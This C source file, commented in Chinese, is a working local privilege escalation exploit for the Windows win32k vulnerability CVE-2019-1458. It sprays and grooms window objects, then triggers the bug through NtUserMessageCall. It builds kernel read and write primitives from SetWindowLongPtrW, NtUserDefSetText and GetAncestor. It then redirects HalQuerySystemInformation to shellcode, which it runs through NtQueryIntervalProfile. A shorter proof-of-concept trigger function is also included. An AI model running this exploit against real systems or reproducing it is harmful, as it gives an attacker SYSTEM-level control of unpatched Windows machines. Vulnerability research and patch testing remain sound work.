#include "CVE-2019-1458.h"

EXTERN_C_START
NTSTATUS NtUserMessageCall(HANDLE hWnd, UINT msg, WPARAM wParam, LPARAM lParam, ULONG_PTR ResultInfo, DWORD dwType, BOOL bAscii);
NTSTATUS NtUserDefSetText(HANDLE hWnd, PLARGE_UNICODE_STRING plstr);
ULONG g_NtUserDefSetText_syscall = 0x107F, g_NtUserMessageCall_syscall = 0x1007;
EXTERN_C_END

BOOL Exploit_CVE_2019_1458()
{
	BOOL bRet = TRUE;
	HWND hWndList[105] = { 0 };

	if (!Init_CVE_2019_1458(hWndList))
	{
		bRet = FALSE;
		goto exit;
	}

	if (!Trigger_CVE_2019_1458(hWndList))
	{
		bRet = FALSE;
		goto exit;
	}

exit:
	for (DWORD i = 0; i < 100; i++)
	{
		if (hWndList[i])
		{
			DestroyWindow(hWndList[i]);
			hWndList[i] = NULL;
		}
	}
	return bRet;
}

BOOL Trigger_CVE_2019_1458(HWND *hWndList)
{
	BOOL bRet = TRUE;
	HINSTANCE handle = NULL;
	lHMValidateHandle HMValidateHandle = NULL;

	handle = GetModuleHandle(NULL);
	if (!handle)
	{
		bRet = FALSE;
		ShowError("GetModuleHandle", GetLastError());
		goto exit;
	}

	HMValidateHandle = (lHMValidateHandle)GetHMValidateHandle();
	if (!HMValidateHandle)
	{
		bRet = FALSE;
		goto exit;
	}

	char *pBuf = "Trigger";
	WNDCLASSEX wc = { 0 };

	wc.cbSize = sizeof(wc);
	wc.cbWndExtra = 8;
	wc.hInstance = handle;
	wc.lpfnWndProc = DefWindowProc;
	wc.lpszClassName = pBuf;

	if (!RegisterClassEx(&wc))
	{
		bRet = FALSE;
		ShowError("RegisterClassEx", GetLastError());
		goto exit;
	}

	HWND hTriggerWnd = NULL;

	// 创建用来触发漏洞的窗口,指定窗口带有WS_VISIBLE
	hTriggerWnd = CreateWindowEx(0, pBuf, NULL, WS_VISIBLE, 0, 0, 0, 0,
								 NULL, NULL, handle, NULL);
	if (!hTriggerWnd)
	{
		bRet = FALSE;
		ShowError("CreateWindowEx", GetLastError());
		goto exit;
	}

	// 寻找用来攻击的窗口
	ULONG64 ulTriggerAddr = 0, ulAttackAddr = 0, i = 0;
	PTHRDESKHEAD pTriggerHead = (PTHRDESKHEAD)HMValidateHandle(hTriggerWnd, TYPE_WINDOW);
	
	ulTriggerAddr = (ULONG64)pTriggerHead->pSelf;
	HWND hAttackWnd = NULL;
	for (i = 0; i < 100; i++)
	{
		if (hWndList[i])
		{
			PTHRDESKHEAD pAttackHead = (PTHRDESKHEAD)HMValidateHandle(hWndList[i], TYPE_WINDOW);
			ulAttackAddr = (ULONG64)pAttackHead->pSelf;
			if (ulAttackAddr > ulTriggerAddr && ulAttackAddr - ulTriggerAddr < 0xFF0000)
			{
				hAttackWnd = hWndList[i];
				break;
			}
		}
	}

	if (!hAttackWnd)
	{
		printf("Do not find Attack tagWND\n");
		bRet = FALSE;
		goto exit;
	}
	
	// 设置tagWND->fnid为0x2A0
	NtUserMessageCall(hTriggerWnd, WM_CREATE, 0, 0, 0, 0, 0);

	// 设置内存地址
	ULONG64 ulValue = ulTriggerAddr + 0xE8 - 0x60;
	SetWindowLongPtrW(hTriggerWnd, 0, ulValue);

	// 设置[gpsi + 0x154] = 0x130
	if (!CreateWindowEx(0, "#32771", NULL, 0, 0, 0, 0, 0,
						NULL, NULL, handle, NULL))
	{
		bRet = FALSE;
		ShowError("CreateWindowEx", GetLastError());
		goto exit;
	}

	// 模拟Alt按键
	BYTE keyState[256];
	GetKeyboardState(keyState);
	keyState[VK_MENU] |= 0x80;
	SetKeyboardState(keyState);

	// 触发漏洞
	NtUserMessageCall(hTriggerWnd, WM_ERASEBKGND, 0, 0, 0, 0, 0);

	ULONG64 ulOffset = ulAttackAddr - ulTriggerAddr - 0x128;
	if (!EnablePrivilege_CVE_2019_1458(hTriggerWnd, hAttackWnd, ulOffset))
	{
		bRet = FALSE;
		goto exit;
	}

	/*
	WriteData_CVE_2019_1458(hTriggerWnd, hAttackWnd, (PVOID)(ulTriggerAddr + 0xD8), NULL, ulOffset);
	WriteData_CVE_2019_1458(hTriggerWnd, hAttackWnd, (PVOID)(ulTriggerAddr + 0xE0), NULL, ulOffset);
	WriteData_CVE_2019_1458(hTriggerWnd, hAttackWnd, (PVOID)(ulTriggerAddr + 0xF8), NULL, ulOffset);
	*/
exit:
	/*
	// 释放窗口的时候会造成蓝屏
	if (hTriggerWnd)
	{
		DestroyWindow(hTriggerWnd);
		hTriggerWnd = NULL;
	}*/

	return bRet;
}

BOOL EnablePrivilege_CVE_2019_1458(HWND hTriggerWnd, HWND hAttackWnd, ULONG64 ulOffset)
{
	BOOL bRet = TRUE;

	PVOID pTargetAddr = NULL;

	pTargetAddr = GetHalQuerySystemInformation();
	if (!pTargetAddr)
	{
		bRet = FALSE;
		goto exit;
	}

	ULONG64 ulOrgFunAddr = 0;

	// 获取原函数地址
	ulOrgFunAddr = ReadData_CVE_2019_1458(hTriggerWnd, hAttackWnd, pTargetAddr, ulOffset);

	// 将函数修改为ShellCode地址
	WriteData_CVE_2019_1458(hTriggerWnd, hAttackWnd, pTargetAddr, ShellCodeInWin7, ulOffset);

	// 调用函数执行ShellCode实现提权
	if (!CallNtQueryIntervalProfile())
	{
		bRet = FALSE;
		goto exit;
	}
	
	// 恢复原函数
	WriteData_CVE_2019_1458(hTriggerWnd, hAttackWnd, pTargetAddr, (PVOID)ulOrgFunAddr, ulOffset);

exit:
	return bRet;
}

VOID WriteData_CVE_2019_1458(HWND hTriggerWnd, HWND hAttackWnd, PVOID pTargetAddr, PVOID pValue, ULONG64 ulOffset)
{
	BOOL bRet = TRUE;

	// 设置要写入的地址
	SetWindowLongPtrW(hTriggerWnd, ulOffset + 0xE0, (ULONG64)pTargetAddr);

	LARGE_UNICODE_STRING lstrData = { 0 };
	lstrData.Length = 0x8;
	lstrData.MaximumLength = 0xA;
	lstrData.Buffer = (PWCHAR)&pValue;
	NtUserDefSetText(hAttackWnd, &lstrData);
}

ULONG64 ReadData_CVE_2019_1458(HWND hTriggerWnd, HWND hAttackWnd, PVOID pTargetAddr, ULONG64 ulOffset)
{
	ULONG64 ulOrg = 0, ulOrgPar = 0;
	ULONG64 ulParOffset = ulOffset + 0x58;

	// 获取tagWND->spwndParent
	ulOrgPar = GetWindowLongPtrW(hTriggerWnd, ulParOffset);

	// 设置tagWND->spwndParent为目标地址
	SetWindowLongPtrW(hTriggerWnd, ulParOffset, (ULONG64)pTargetAddr);
	// 读取目标地址内容
	ulOrg = (ULONG64)GetAncestor(hAttackWnd, GA_PARENT);
	// 恢复tagWND->spwndParent
	SetWindowLongPtrW(hTriggerWnd, ulParOffset, ulOrgPar);

	return ulOrg;
}

BOOL Init_CVE_2019_1458(HWND *hWndList)
{
	BOOL bRet = TRUE;
	WNDCLASSEX wc = { 0 };
	char *pAttackName = "Attack";
	DWORD i = 0;
	HINSTANCE handle = NULL;

	handle = GetModuleHandle(NULL);
	if (!handle)
	{
		bRet = FALSE;
		ShowError("GetModuleHandle", GetLastError());
		goto exit;
	}

	memset(&wc, 0, sizeof(wc));
	wc.cbSize = sizeof(wc);
	wc.hInstance = GetModuleHandle(NULL);
	wc.lpfnWndProc = DefWindowProc;
	wc.lpszClassName = pAttackName;
	wc.cbWndExtra = 8;

	if (!RegisterClassEx(&wc))
	{
		ShowError("RegisterClassEx", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	// 创建用来攻击的窗口
	for (i = 0; i < 100; i++)
	{
		hWndList[i] = CreateWindowEx(NULL,
									 pAttackName,
									 "Hack Window",
									 WS_VISIBLE,
									 0, 0, 0, 0,
									 NULL,
									 0,
								     handle,
									 0);
		if (!hWndList[i])
		{
			ShowError("CreateWindowEx", GetLastError());
			bRet = FALSE;
			goto exit;
		}
	}

	// 释放其中的一部分用来保存触发漏洞时候创建的窗口
	for (i = 20; i < 80; i += 2)
	{
		if (!DestroyWindow(hWndList[i]))
		{
			ShowError("DestroyWindow", GetLastError());
			bRet = FALSE;
			goto exit;
		}
		hWndList[i] = NULL;
	}

exit:
	return bRet;
}

BOOL POC_CVE_2019_1458()
{
	BOOL bRet = TRUE;
	HINSTANCE handle = NULL;

	handle = GetModuleHandle(NULL);
	if (!handle)
	{
		bRet = FALSE;
		ShowError("GetModuleHandle", GetLastError());
		goto exit;
	}

	char *pBuf = "POC";
	WNDCLASSEX wc = { 0 };

	wc.cbSize = sizeof(wc);
	wc.cbWndExtra = 8;
	wc.hInstance = handle;
	wc.lpfnWndProc = DefWindowProc;
	wc.lpszClassName = pBuf;

	if (!RegisterClassEx(&wc))
	{
		bRet = FALSE;
		ShowError("RegisterClassEx", GetLastError());
		goto exit;
	}

	HWND hPocWnd = NULL;

	// 创建用来触发漏洞的窗口,指定窗口带有WS_VISIBLE
	hPocWnd = CreateWindowEx(0, pBuf, NULL, WS_VISIBLE, 0, 0, 0, 0,
							 NULL, NULL, handle, NULL);
	if (!hPocWnd)
	{
		bRet = FALSE;
		ShowError("CreateWindowEx", GetLastError());
		goto exit;
	}

	// 设置tagWND->fnid为0x2A0
	NtUserMessageCall(hPocWnd, WM_CREATE, 0, 0, 0, 0, 0);

	// 设置内存地址
	SetWindowLongPtrW(hPocWnd, 0, 0x1900);

	// 设置[gpsi + 0x154] = 0x130
	if (!CreateWindowEx(0, "#32771", NULL, 0, 0, 0, 0, 0,
						NULL, NULL, handle, NULL))
	{
		bRet = FALSE;
		ShowError("CreateWindowEx", GetLastError());
		goto exit;
	}
	
	// 触发漏洞
	NtUserMessageCall(hPocWnd, WM_ERASEBKGND, 0, 0, 0, 0, 0);

exit:
	return bRet;
}